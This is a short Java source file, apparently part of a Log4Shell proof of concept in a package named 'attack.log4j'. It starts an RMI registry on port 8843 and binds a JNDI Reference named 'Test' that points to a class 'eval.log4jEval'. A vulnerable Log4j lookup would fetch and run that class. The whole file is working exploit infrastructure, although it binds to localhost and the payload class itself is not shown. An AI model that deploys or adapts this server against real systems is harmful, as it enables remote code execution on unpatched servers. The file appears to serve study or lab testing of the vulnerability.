package attack.log4j;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import javax.naming.NamingException;
import javax.naming.Reference;

public class RMIServer {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        LocateRegistry.createRegistry(8843);
        final Registry registry = LocateRegistry.getRegistry("127.0.0.1", 8843);
        Reference ref = new Reference("eval.log4jEval","eval.log4jEval",null);

        final ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("Test", referenceWrapper);
    }
}